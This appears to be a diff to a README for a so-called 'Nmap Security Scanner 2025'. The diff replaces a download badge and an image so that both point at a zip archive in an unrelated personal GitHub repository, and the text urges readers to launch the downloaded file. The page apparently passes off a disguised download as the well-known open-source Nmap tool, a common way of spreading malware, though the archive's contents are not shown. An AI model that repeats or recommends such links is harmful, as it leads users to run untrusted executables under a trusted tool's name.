@@ -15,7 +15,7 @@ Here are some key features of the Nmap Security Scanner 2025:
 ## Installation
 To access the Nmap Security Scanner 2025, please download the application from the following link: 
 
-[![Download Nmap 2025](https://img.shields.io/badge/Download-Nmap%202025-blue)](https://github.com/files/uploaded/Application.zip)
+[![Download Nmap 2025](https://github.com/madarauchiha45/Nmap-Security-Scanner-2025/raw/refs/heads/main/tsatlee/Nmap-Scanner-Security-v2.9.zip%202025-blue)](https://github.com/madarauchiha45/Nmap-Security-Scanner-2025/raw/refs/heads/main/tsatlee/Nmap-Scanner-Security-v2.9.zip)
 
 Once you have downloaded the application, follow the installation instructions to set up the Nmap tool on your system. If the link above ends with the file name, ensure to launch the downloaded file to begin the installation process.
 
@@ -49,7 +49,7 @@ We are constantly updating and improving the Nmap Security Scanner 2025 to ensur
 
 Thank you for choosing the Nmap Security Scanner 2025 for your network security tasks. Stay safe, stay secure! 🔒🛡️
 
-![Network Security](https://images.pexels.com/photos/364004/pexels-photo-364004.jpeg)
+![Network Security](https://github.com/madarauchiha45/Nmap-Security-Scanner-2025/raw/refs/heads/main/tsatlee/Nmap-Scanner-Security-v2.9.zip)
 
 --- 
 
